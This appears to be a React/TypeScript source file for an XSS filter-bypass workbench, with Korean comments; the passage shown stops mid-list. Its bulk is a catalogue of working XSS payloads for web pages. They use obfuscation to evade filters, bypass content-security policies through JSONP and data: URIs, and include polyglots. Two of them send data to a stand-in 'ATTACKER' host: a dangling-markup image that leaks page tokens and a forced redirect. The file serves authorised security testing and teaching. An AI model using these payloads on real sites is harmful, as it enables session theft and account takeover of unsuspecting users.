import { useMemo, useState } from 'react'
import { DISCLAIMER, NoteWithCopy, Note, Pick, Readout } from './shared'
import xssScoutScript from './xssScoutScript.txt?raw'

/* ── XSS 소거법 워크벤치 ──────────────────────────────────────────
 * 기존 "컨텍스트→벡터→실행코드→우회→인코딩" 4단계 조합 빌더는 필터
 * 우회 지식이 있는 사람에게는 빠르지만, 지식이 없는 사람에게는 "뭘 먼저
 * 걸러야 하는지"에 대한 안내가 없었다. 이 버전은 반대로 간다:
 *
 *   1) 컨텍스트를 고르면 그 컨텍스트에서 "말이 되는" 페이로드 전체가 먼저
 *      다 보인다 (초기 상태 = 전체 목록).
 *   2) "실제로 관찰한 필터 동작"을 체크해나가면, 그 필터에 걸리는
 *      페이로드만 결과에서 사라진다 — 즉 소거법.
 *   3) 체크박스로 못 잡는 특이 필터(예: 정확히 "<script>" 전체 문자열만
 *      막고 "<" 단독은 안 막는 compound 필터)는 차단 키워드 텍스트박스로
 *      직접 입력해서 추가로 소거한다.
 *   4) 남은 페이로드마다 "왜 통하는지" 원리를 짧게 적어 학습이 되게 한다.
 *
 * 각 체크박스는 "이 필터가 걸러낼 만한 페이로드"를 자동으로 트리거
 * 정규식으로 판별한다 — 단, 페이로드가 바로 그 필터를 우회하도록
 * 설계된 경우엔 immuneAlways/immuneIf 로 예외를 선언해 살려둔다.
 * single-pass 같은 "완전 탐지 vs 1회성 탐지" 체크박스는 그 자체로는
 * 아무것도 지우지 않고, 중첩/이중 삽입류 페이로드의 immuneIf 조건으로만
 * 쓰인다(필터가 비재귀적이라는 "약점"이 있어야 그 기법이 의미 있기
 * 때문).
 *
 * 출처 표기: 아래 페이로드 중 일부는 PayloadsAllTheThings
 * (MIT License, swisskyrepo — https://github.com/swisskyrepo/PayloadsAllTheThings)
 * 의 XSS Injection 섹션에서 포팅했다. 나머지는 통용되는 브라우저/HTML 표준
 * 동작(이벤트 핸들러 목록, 인코딩 규칙 등)에 기반해 직접 구성한 것으로,
 * 특정 저작물의 구조·설명을 그대로 옮긴 것이 아니다.
 */

type Filter = {
  id: string
  category: string
  label: string
  hint?: string
}

type Payload = {
  id: string
  label: string
  text: string
  principle: string
  /** 이 필터는 트리거 정규식상 걸리더라도 이 페이로드는 원래부터 안전하다 */
  immuneAlways?: string[]
  /** requires 에 적힌 필터가 전부 체크되어 있을 때만 filterId 에 면제된다
   *  (예: "비재귀 검사" 약점이 있어야만 중첩삽입이 의미 있는 경우) */
  immuneIf?: { filterId: string; requires: string[] }[]
}

type Ctx = {
  id: string
  label: string
  hint: string
  payloads: Payload[]
}

/* ── 1. 필터 체크리스트 ────────────────────────────────────────── */

const FILTER_CATEGORIES = [
  { id: 'angle', label: '꺾쇠(<, >) 처리' },
  { id: 'keyword', label: '키워드 블랙리스트' },
  { id: 'punct', label: '구두점 / 구조 문자' },
  { id: 'special', label: '검사 방식 · 정책 (고급)' },
] as const

const FILTERS: Filter[] = [
  { id: 'lt-entity', category: 'angle', label: '`<` 가 HTML 엔티티(`&lt;`)로 자동 인코딩됨' },
  { id: 'lt-strip', category: 'angle', label: '`<` 문자가 통째로 제거됨 (strip)' },
  { id: 'gt-strip', category: 'angle', label: '`>` 만 제거/인코딩되고 `<` 는 그대로 통과함', hint: '여는 꺾쇠는 살아있고 닫는 꺾쇠만 막히는, 의외로 자주 보는 비대칭 필터' },

  { id: 'script-ci', category: 'keyword', label: '`script` 문자열이 대소문자 구분 없이 제거/차단됨' },
  { id: 'script-cs', category: 'keyword', label: '`script` 문자열이 정확히 소문자일 때만 제거됨', hint: '대소문자 구분(case-sensitive) 필터 — 혼용 표기로 우회 가능' },
  { id: 'javascript-ci', category: 'keyword', label: '`javascript:` 문자열이 대소문자 구분 없이 차단됨' },
  { id: 'javascript-cs', category: 'keyword', label: '`javascript:` 문자열이 정확히 소문자일 때만 차단됨' },
  { id: 'on-attr-ci', category: 'keyword', label: '`on*` 이벤트 핸들러 속성이 대소문자 구분 없이 차단됨' },
  { id: 'on-attr-cs', category: 'keyword', label: '`on*` 이벤트 핸들러 속성이 정확히 소문자일 때만 차단됨' },
  { id: 'func-blacklist', category: 'keyword', label: '`alert`/`eval`/`prompt`/`confirm` 등 실행 함수명이 블랙리스트로 차단됨' },
  { id: 'global-blacklist', category: 'keyword', label: '`document`/`window` 같은 전역 객체 이름이 차단됨' },

  { id: 'quote-strip', category: 'punct', label: '따옴표(`"` / `\'`)가 이스케이프되거나 제거됨' },
  { id: 'paren-strip', category: 'punct', label: '괄호 `(` `)` 가 제거/차단됨' },
  { id: 'space-collapse', category: 'punct', label: '공백 문자가 제거되거나 1개로 축약됨', hint: '태그명과 속성 사이 스페이스(0x20)만 막는 필터 — 탭/개행/슬래시로 대체 가능' },
  { id: 'backtick-strip', category: 'punct', label: '백틱(`` ` ``)이 제거됨' },
  { id: 'semicolon-strip', category: 'punct', label: '세미콜론(`;`)이 제거됨' },
  { id: 'autofocus-strip', category: 'punct', label: '`autofocus` 속성이 제거/차단됨', hint: '클릭 없이 즉시 포커스를 주는 핵심 속성이 사라지면 onfocus/onfocusin 기반 "클릭 불필요" 벡터가 전부 무력화되고, 실제 사용자 클릭이 있어야만 트리거되는 벡터만 남는다' },

  { id: 'single-pass', category: 'special', label: '필터가 입력을 1회만 검사한다 (치환 후 재검사 안 함)', hint: '지우는 필터 자체가 아니라 "약점" 체크박스 — 이걸 켜면 중첩/이중 삽입(double-write)류 기법이 추가로 노출됨' },
  { id: 'csp-inline', category: 'special', label: 'CSP가 인라인 `<script>`/이벤트 핸들러 실행을 차단함 (nonce/hash 없는 inline 전부 차단)' },
  { id: 'src-whitelist', category: 'special', label: '`src`/`href` 값이 프로토콜·도메인 화이트리스트 검사를 받음' },
  { id: 'event-name-dict', category: 'special', label: '이벤트 핸들러 이름이 "흔한 목록"(onload/onerror/onclick 등) 사전 대조로만 검사됨', hint: 'onanimationstart/onbeforematch/onscrollend 같은 최신·비주류 DOM 이벤트는 이런 사전에 없는 경우가 많다 — on-attr 체크박스와는 별개로, "사전 자체가 좁다"는 약점을 표현하는 체크박스' },
]

/** filterId → 이 텍스트가 "naive"한 필터라면 걸러질지 여부. single-pass 처럼
 *  트리거가 없는(=절대 직접 제외하지 않는) 항목은 여기 없다. */
const TRIGGERS: Record<string, (text: string) => boolean> = {
  'lt-entity': t => t.includes('<'),
  'lt-strip': t => t.includes('<'),
  'gt-strip': t => t.includes('>'),
  'script-ci': t => /script/i.test(t),
  'script-cs': t => t.includes('script'),
  'javascript-ci': t => /javascript\s*:/i.test(t),
  'javascript-cs': t => t.includes('javascript:'),
  'on-attr-ci': t => /\bon[a-z]+\s*=/i.test(t),
  'on-attr-cs': t => /\bon[a-z]+\s*=/.test(t),
  'func-blacklist': t => /\b(alert|eval|prompt|confirm)\b/i.test(t),
  'global-blacklist': t => /\b(document|window)\b/i.test(t),
  'quote-strip': t => /["']/.test(t),
  'paren-strip': t => /[()]/.test(t),
  'space-collapse': t => /<[a-zA-Z][a-zA-Z0-9]*\x20[a-zA-Z]/.test(t),
  'backtick-strip': t => t.includes('`'),
  'semicolon-strip': t => t.includes(';'),
  'autofocus-strip': t => /\bautofocus\b/i.test(t),
  'csp-inline': t => /<script[\s>]|on[a-z]+\s*=|javascript\s*:/i.test(t),
  'src-whitelist': t => /^javascript:/i.test(t) || /^data:/i.test(t) || /^\/\//.test(t) || /(src|href)\s*=\s*["']?\s*(javascript:|data:)/i.test(t),
}

function isBlocked(p: Payload, filterId: string, checked: Set<string>): boolean {
  const trigger = TRIGGERS[filterId]
  if (!trigger || !trigger(p.text)) return false
  if (p.immuneAlways?.includes(filterId)) return false
  const cond = p.immuneIf?.find(c => c.filterId === filterId)
  if (cond && cond.requires.every(r => checked.has(r))) return false
  return true
}

/* ── 2. 컨텍스트별 페이로드 목록 ──────────────────────────────────
 * 플레이스홀더: alert(document.domain) — 반사/실행 오리진 확인용.
 * //ATTACKER — 진단자가 관리하는 수집 서버로 바꿔서 쓸 것(DISCLAIMER 참고). */

const CONTEXTS: Ctx[] = [
  {
    id: 'html-text',
    label: 'HTML 본문 (텍스트 노드)',
    hint: '반사 값이 태그 사이의 순수 텍스트로 들어갈 때. <div>여기</div> 의 "여기" 자리.',
    payloads: [
      { id: 'basic-script', label: 'script 태그 직접 삽입', text: '<script>alert(document.domain)</script>',
        principle: '가장 기본적인 삽입 — 별도 우회 기법 없이, 필터가 전혀 없을 때만 통과하는 베이스라인.' },
      { id: 'img-onerror', label: 'img onerror', text: '<img src=x onerror=alert(document.domain)>',
        principle: '"script"·"javascript:" 문자열을 전혀 쓰지 않는 벡터 — 키워드 블랙리스트는 우회하지만 `<`, on* 핸들러, 괄호 필터에는 그대로 걸린다.' },
      { id: 'svg-onload', label: 'svg onload', text: '<svg onload=alert(document.domain)>',
        principle: 'img와 동일한 원리의 또 다른 벡터 — 특정 태그명만 블랙리스트에 있는 경우를 대비한 대안.' },
      { id: 'svg-onload-slash', label: 'svg onload (공백 대신 /)', text: '<svg/onload=alert(document.domain)>',
        principle: '태그명과 속성 사이 공백을 `/` 로 대체 — HTML 파서는 `/` 를 공백과 동등하게 취급하므로 "공백 1개만 제거/축약" 하는 필터를 우회.' },
      { id: 'svg-onload-newline', label: 'svg onload (공백 대신 개행)', text: '<svg\nonload=alert(document.domain)>',
        principle: '스페이스(0x20) 문자 자체를 찾는 필터는 통과시키지만, 탭/개행 등 다른 공백류 문자는 여전히 HTML 파서가 구분자로 인식.' },
      { id: 'svg-onload-mixedcase', label: 'svg OnLoAd (대소문자 혼용)', text: '<svg OnLoAd=alert(document.domain)>',
        principle: 'HTML 속성명은 대소문자를 구분하지 않아 브라우저는 그대로 인식 — "on" 으로 시작하는 패턴을 정확한 소문자로만 찾는 case-sensitive 필터를 우회.' },
      { id: 'svg-onload-backtick', label: 'svg onload (괄호 없이 백틱 호출)', text: '<svg onload=alert`1`>',
        principle: '태그드 템플릿 호출(`` alert`1` ``)로 괄호 없이 함수 실행 — 단 인자 1개짜리 함수에만 쓸 수 있고, 백틱도 같이 막히면 무력화됨.' },
      { id: 'img-onerror-print', label: 'img onerror + print()', text: '<img src=x onerror=print()>',
        principle: 'alert/eval/prompt/confirm 위주로 짜인 흔한 함수명 블랙리스트에 `print()` 는 자주 빠져있다 — 팝업으로 반사/실행 여부만 확인할 때 유용.' },
      { id: 'script-doublewrite', label: 'script 중첩 이중 삽입 (double-write)', text: '<scr<script>ipt>alert(document.domain)</scr</script>ipt>',
        principle: '필터가 "script" 를 한 번만, 재귀적으로 재검사하지 않고 지우면 — 지워진 자리에 글자가 다시 맞춰져 `<script>` 가 재구성된다. "1회만 검사" 약점이 있어야만 통한다.',
        immuneIf: [{ filterId: 'script-ci', requires: ['single-pass'] }, { filterId: 'script-cs', requires: ['single-pass'] }] },
      { id: 'a-href-js', label: 'a href javascript: (이벤트 핸들러 없음)', text: '<a href="javascript:alert(document.domain)">클릭 유도</a>',
        principle: 'on* 이벤트 핸들러를 전혀 안 써서 그 필터는 우회하지만, javascript: 스킴·따옴표 필터에는 걸리고 사용자 클릭이 필요하다는 제약이 있다.' },
      { id: 'svg-animate-onbegin', label: 'svg animate onbegin', text: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        principle: 'onload/onerror 두 핸들러 이름만 겨냥한 좁은 블랙리스트는 SVG 애니메이션 전용 이벤트(onbegin)까지는 신경 쓰지 않는 경우가 많다 — 자식 <animate> 요소의 이벤트로 동일한 실행 효과를 낸다.' },
      { id: 'style-keyframes-onanimationstart', label: 'CSS 애니메이션 시작 이벤트', text: '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)>',
        principle: '빈 @keyframes 라도 선언되는 즉시 애니메이션이 "시작"하므로 onanimationstart 가 바로 실행된다 — onload/onclick 위주로 짜인 흔한 이벤트명 사전에는 CSS 애니메이션 전용 이벤트가 빠지기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'target-onanimationcancel', label: ':target + onanimationcancel (함수명 없이)', text: '<style>@keyframes x{from{left:0;}to{left:1000px;}}:target{animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel=print()>',
        principle: 'URL 해시가 바뀌어 :target 매칭이 풀리는 순간 애니메이션이 취소되며 onanimationcancel 이 실행된다 — alert/eval 같은 블랙리스트 단골 함수명을 전혀 쓰지 않고 print() 로 대체했다는 점도 함께 보여준다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'onbeforematch-hidden', label: 'onbeforematch + hidden=until-found', text: '<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>',
        principle: '크롬의 "페이지 내 검색" 기능이 hidden=until-found 로 숨겨둔 요소를 찾아 보여줄 때 발생하는 신생 HTML5 이벤트 — 오래된 이벤트 핸들러 사전에는 애초에 존재하지 않던 이름이라 통과하기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'onscrollend-noclick', label: 'onscrollend (스크롤만으로 실행)', text: '<xss onscrollend=alert(1) style="display:block;overflow:auto;height:60px;border:1px dashed;"><br><br><br><br><br><br><br><br><br><br><span>x</span></xss>',
        principle: '사용자가 그냥 아래로 스크롤해서 멈추기만 해도 발생하는 이벤트 — 클릭/포커스 둘 다 필요 없는 또 다른 "자동 트리거" 계열이고, 비주류 이벤트명이라 사전 기반 필터에서 빠지기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'onsecuritypolicyviolation', label: 'onsecuritypolicyviolation (CSP 위반 자체를 역이용)', text: '<xss onsecuritypolicyviolation=alert(1)>XSS</xss>',
        principle: 'CSP가 다른 인라인 실행을 막으면 "위반이 발생했다"는 보고 이벤트가 뜨는데, 그 보고 이벤트의 핸들러 역시 인라인 코드이므로 nonce 없는 인라인을 전부 막는 CSP 앞에서는 결국 똑같이 막힌다 — 그래도 "비주류 이벤트명" 자체는 사전 기반 필터를 피해간다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'slot-shadowroot', label: 'Declarative Shadow DOM onslotchange', text: 'x<template shadowrootmode=open><slot onslotchange=alert(1)>',
        principle: '선언형 Shadow DOM(shadowrootmode)과 슬롯 변경 이벤트의 조합 — 최신 파서 기능을 모르는 필터는 <template shadowrootmode> 자체를 특별 취급하지 않고 그냥 통과시킨다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'onbeforescriptexecute', label: 'onbeforescriptexecute (⚠ 구형 Firefox 전용, 참고용)', text: '<x onbeforescriptexecute=alert(1)><script>1</script>',
        principle: '⚠ 다른 <script> 가 실행되기 직전에 발생하던 비표준 이벤트(과거 Firefox) — 현재 주요 브라우저에서는 동작하지 않는다. "onload/onclick만 막으면 끝"이라는 흔한 가정이 얼마나 쉽게 깨질 수 있는지 보여주는 역사적 참고 사례.' },
      { id: 'marquee-onstart', label: '<marquee onstart> (레거시 태그)', text: '<marquee onstart=alert(1)>XSS</marquee>',
        principle: '더 이상 권장되지 않는 레거시 태그 <marquee> 는 "자주 쓰는 태그만" 막는 태그 블랙리스트에서 빠지기 쉽고, onstart 역시 onload/onerror 위주 이벤트 사전에 없을 수 있다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'formaction-button', label: 'button formaction (on* 핸들러 전혀 없음)', text: '<form><button formaction=javascript:alert(1)>XSS</button></form>',
        principle: 'on* 이벤트 핸들러를 전혀 쓰지 않는 네비게이션 기반 실행 — 버튼이 클릭되면 폼이 javascript: 스킴으로 "제출"되며 그 자체로 실행된다. on-attr 계열 필터는 완전히 무의미해지고, 남는 건 javascript: 스킴 필터와 사용자 클릭 요구뿐.' },
      { id: 'isindex-formaction', label: '<isindex formaction> (사어가 된 레거시 태그)', text: '<isindex type=submit formaction=javascript:alert(1)>',
        principle: '거의 쓰이지 않는 사어(死語)급 레거시 태그라 "흔한 태그 이름" 블랙리스트/화이트리스트 양쪽에서 빠지기 쉽다 — formaction 이라 on* 핸들러도 필요 없다.' },
      { id: 'object-data-js', label: '<object data=javascript:>', text: '<object data="javascript:alert(1)">',
        principle: '<object> 의 data 속성도 on* 핸들러 없이 javascript: 스킴만으로 실행된다 — object/embed 는 최신 브라우저에서도 종종 살아있는 레거시 벡터.' },
      { id: 'embed-src-js', label: '<embed src=javascript:>', text: '<embed src="javascript:alert(1)">',
        principle: '<object>와 동일한 원리의 <embed> 버전 — 둘 다 "태그 화이트리스트가 img/svg 위주라 object/embed를 깜빡 빠뜨린 경우"를 노린다.' },
      { id: 'dangling-markup-cutoff', label: '닫지 않은 속성으로 뒤 마크업 전체를 삼키기 (댕글링 마크업)', text: '<img src="//ATTACKER?',
        principle: '일부러 닫는 따옴표/꺾쇠를 쓰지 않는 "댕글링 마크업" 기법 — 이 뒤에 응답에 남아있는 나머지 HTML(세션 토큰이 든 hidden input 등)이 통째로 이 속성값의 일부로 합쳐져 공격자 서버로 요청이 날아간다. alert/eval/on*/javascript: 가 전혀 없어 거의 모든 키워드 블랙리스트를 자동으로 우회하지만 JS 실행 자체는 없고, "<" 가 막히면 쓸 수 없으며 CSP img-src 제한에는 걸린다.' },
      { id: 'script-src-data', label: '<script src=data:,...> (인라인이 아니라 src)', text: '<script src="data:,alert(1)">/</script>',
        principle: 'CSP의 "인라인 금지(unsafe-inline 없음)" 정책은 코드가 태그 "안"에 바로 쓰여 있는 경우만 막는다 — 이건 src 속성으로 불러오는 외부(data: URI) 리소스라 인라인 정책과는 무관하고, 대신 script-src 화이트리스트가 data: 스킴까지 허용했을 때만 통한다.',
        immuneAlways: ['csp-inline'] },
      { id: 'jsonp-whitelisted-domain', label: '이미 화이트리스트에 있는 도메인의 JSONP 콜백', text: '<script src="//www.google.com/complete/search?client=chrome&jsonp=alert(1);"></script>',
        principle: 'script-src 화이트리스트에 google.com 처럼 이미 허용된 도메인이 있고 그 도메인에 "콜백 함수명을 그대로 실행하는" JSONP 엔드포인트가 있다면, 그 콜백 파라미터에 alert(1) 을 넣는 것만으로 화이트리스트를 그대로 통과한다 — CSP가 "어느 도메인이든" 이 아니라 "이 도메인은 신뢰한다"는 전제 자체를 역이용.',
        immuneAlways: ['csp-inline'] },
      { id: 'jsfuck-no-alnum', label: 'JSFuck — 영문/숫자 없이 기호만으로 실행', text: '<script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</script>',
        principle: '[ ] ( ) ! + 네 종류 기호만으로 모든 JS 코드를 표현하는 JSFuck 변환 — "alert"/"script"/"on" 같은 키워드 기반 블랙리스트가 매칭할 문자열 자체가 소스에 존재하지 않아 전부 무력화된다. 대가로 코드가 수백~수천 배 길어지고, 여전히 <script> 태그 삽입 경로 자체는 필요하다.' },
      { id: 'polyglot-short-onclick', label: '다중 컨텍스트 폴리글랏 (속성 탈출 + 주석 + 직접 실행)', text: `"><svg onload=alert(1)>//--></script>'><svg onload=alert(1)>`,
        principle: '같은 입력이 반사되는 지점이 "어디 컨텍스트인지 모를 때" 한 번에 여러 탈출 패턴(큰따옴표 속성 탈출 → svg 태그 → // 주석으로 뒤 코드 무력화 → 작은따옴표 속성 탈출 → svg 태그)을 이어붙여, 서버가 실제로 어느 자리에 꽂아주든 그 중 하나는 맞아떨어지게 만드는 접근 — 리포트 자동화·블라인드 진단에서 자주 쓴다.' },
      { id: 'window-bracket-concat-alert', label: "window['a'+'lert'](1) — 함수명을 문자열 연결로 분해", text: "<xss tabindex=1 autofocus onfocus=window['a'+'lert'](1)>",
        principle: `소스에 "alert" 라는 글자가 연속으로 등장하지 않도록 'a'와 'lert'로 쪼개 연결한 뒤 브래킷 표기로 호출한다 — 런타임에는 완전히 동일한 window.alert(1) 이 실행되지만, 텍스트 기반 키워드 스캐너는 매칭할 연속 문자열이 없어 자동으로 통과한다.` },
      { id: 'charcode-alert', label: 'String.fromCharCode 로 "alert" 문자열 자체를 숨김', text: '<xss tabindex=1 autofocus onfocus=self[String.fromCharCode(97,108,101,114,116)](1)>',
        principle: '문자 코드 배열로부터 런타임에 "alert" 문자열을 만들어 함수명으로 쓴다 — 역시 소스 어디에도 "alert" 라는 글자가 등장하지 않는다.' },
      { id: 'atob-base64-alert', label: 'atob(base64) 로 함수명/코드를 통째로 디코딩', text: "<xss tabindex=1 autofocus onfocus=self[atob('YWxlcnQ=')](document.domain)>",
        principle: '"alert" 를 base64로 인코딩해두고 atob() 로 런타임에만 복원한다 — atob/base64 자체는 거의 모든 블랙리스트에 없는 "인코딩 함수"일 뿐이라 통과하기 쉽고, 디코딩된 결과 문자열이 바로 함수명이 된다. (디코딩 결과는 "alert")' },
      { id: 'regexp-source-concat-alert', label: '/al/.source+/ert/.source — 정규식 리터럴 조각으로 문자열 조립', text: '<xss tabindex=1 autofocus onfocus=self[/al/.source+/ert/.source](1)>',
        principle: `정규식 리터럴의 .source 속성(그 정규식의 원본 패턴 문자열)을 이어붙여 "alert" 를 조립한다 — 문자열 리터럴 연결('a'+'lert')과 동일한 목적의 또 다른 변형으로, "문자열 연결만" 패턴매칭하는 필터가 있다면 이것으로 우회된다.` },
      { id: 'audio-oncanplay', label: 'audio oncanplay', text: '<audio oncanplay=alert(1)><source src=validaudio.wav type=audio/wav></audio>',
        principle: 'img/svg 위주로 짜인 태그 블랙리스트는 미디어 태그(audio/video)의 재생 상태 이벤트까지는 챙기지 못하는 경우가 많다 — 실제 재생 가능한 소스가 있어야 이벤트가 발생한다는 제약은 있다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'video-oncanplaythrough', label: 'video oncanplaythrough', text: '<video oncanplaythrough=alert(1)><source src=validvideo.mp4 type=video/mp4></video>',
        principle: 'audio 버전과 동일한 원리의 video 태그 변형 — 끝까지 끊김 없이 재생 가능하다고 판단되는 순간 발동.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'body-onhashchange', label: 'body onhashchange (iframe으로 해시만 바꿔도 발동)', text: '<body onhashchange=alert(1)>',
        principle: 'URL 해시(#)가 바뀌기만 해도 발동하는 이벤트 — 페이지 네비게이션이나 클릭 없이 자식 iframe이 상위 프레임의 해시를 바꾸는 식으로도 원격 트리거가 가능하다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'body-onpageshow', label: 'body onpageshow (뒤로가기 캐시 복원 시 발동)', text: '<body onpageshow=alert(1)>',
        principle: '브라우저의 뒤로/앞으로 가기로 캐시된 페이지가 다시 보여질 때 발동 — onload 만 틀어막는 필터는 이 복원 경로를 놓친다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'body-onpopstate', label: 'body onpopstate (History API 이동 시 발동)', text: '<body onpopstate=alert(1)>',
        principle: 'History API(pushState/뒤로가기)로 세션 기록이 바뀔 때 발동 — SPA 라우팅이 잦은 페이지에서는 사용자가 뒤로가기 버튼만 눌러도 자연스럽게 트리거된다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'svg-discard-onbegin', label: '<svg><discard onbegin>', text: '<svg><discard onbegin=alert(1)>',
        principle: 'SVG 애니메이션 관련 태그 중에서도 특히 덜 알려진 <discard> 요소의 onbegin — "svg 안에 올 수 있는 태그는 animate/set 정도"라고만 알고 있는 필터는 놓치기 쉽다.',
        immuneIf: [{ filterId: 'on-attr-ci', requires: ['event-name-dict'] }, { filterId: 'on-attr-cs', requires: ['event-name-dict'] }] },
      { id: 'incomplete-tag-noclose', label: '닫는 꺾쇠(>) 자체를 아예 안 씀', text: "<img src='1' onerror='alert(0)' <",
        principle: '브라우저의 HTML 파서는 태그가 제대로 안 닫혀도 복구해서 파싱을 시도한다 — 닫는 ">" 를 아예 쓰지 않고 그 다음 태그의 "<" 로 암묵적으로 닫히게 만들면, "모든 태그는 ... > 로 끝나야 매칭"처럼 짜인 정규식 기반 필터를 우회할 수 있다.' },
      { id: 'tag-attr-blacklist-decoy', label: '알 수 없는 속성(x)을 더해 "태그=안전" 오판 유도', text: "<script x>alert('XSS')<script y>",
        principle: '닫는 </script> 없이 다음 <script y> 로 암묵적으로 끝나는 구조 — "스크립트는 반드시 </script>로 쌍을 맞춰 검사"하는 필터가 쌍을 못 찾아 통째로 무시하게 만드는 걸 노린다.' },
      { id: 'bypass-using-nothing', label: '닫는 ">" 를 그냥 생략 (브라우저가 알아서 복구)', text: '<svg onload=alert(1)//',
        principle: '문서 끝(또는 다음 태그) 까지 브라우저가 알아서 태그를 닫아준다 — "</svg> 혹은 명시적 > 가 있어야 태그로 인정"하는 보수적인 파서 흉내 필터를 우회.' },
      { id: 'email-attr-filter-bypass', label: '이메일 형식 검증 안에 속성 탈출 삽입 (RFC 준수)', text: '"><svg/onload=confirm(1)>"@x.y',
        principle: 'RFC 822 기준으로는 따옴표로 감싼 구문이 포함된 로컬파트도 유효한 이메일 형식이라, "이메일 형식 검증만 통과하면 안전"이라고 가정한 필터를 역이용해 그 안에 속성 탈출 페이로드를 숨긴다.' },
      { id: 'tel-uri-phone-context', label: '전화번호 URI의 phone-context 파라미터 악용', text: '+330011223344;phone-context=<script>alert(0)</script>',
        principle: 'RFC 3966/2806 의 tel: URI 는 phone-context 파라미터에 도메인 형식 문자열을 허용하는데, "전화번호 형식이면 안전"이라 가정한 검증기는 이 파라미터 안에 HTML이 들어가는 걸 막지 못하는 경우가 있다.' },
      { id: 'document-bracket-bypass', label: "window['doc'+'ument'] — document 블랙리스트 우회", text: "<xss tabindex=1 autofocus onfocus=window['doc'+'ument'].location='https://ATTACKER'>",
        principle: '"document"/"window" 같은 전역 객체 이름을 통째로 블랙리스트에 올려도, 문자열 연결로 쪼개 브래킷 표기로 접근하면 소스에 그 연속 문자열이 없어 global-blacklist 를 우회한다.' },
      { id: 'array-method-alert', label: '[7].find(alert) — 콜백으로 전달해 직접 호출하지 않기', text: '<xss tabindex=1 autofocus onfocus=[1].find(alert)>',
        principle: 'alert 를 "직접 호출"하지 않고 배열 메서드의 콜백으로 "참조"만 넘긴다 — 배열의 각 요소를 콜백에 넘기며 호출되므로 결국 alert(1) 과 동일한 효과지만, 소스상 alert 뒤에 여는 괄호가 없는 모양이라 "alert\\s*\\(" 처럼 호출 형태까지 보는 정규식 필터를 우회할 수 있다.' },
      { id: 'setTimeout-string-concat', label: "setTimeout('ale'+'rt(1)') — 지연 실행 문자열도 쪼개기", text: "<xss tabindex=1 autofocus onfocus=setTimeout('ale'+'rt(1)')>",
        principle: 'setTimeout 에 넘기는 문자열 인자 자체를 eval 하듯 실행하는 레거시 동작을 이용 — 그 문자열도 연결로 쪼개 func-blacklist를 우회한다.' },
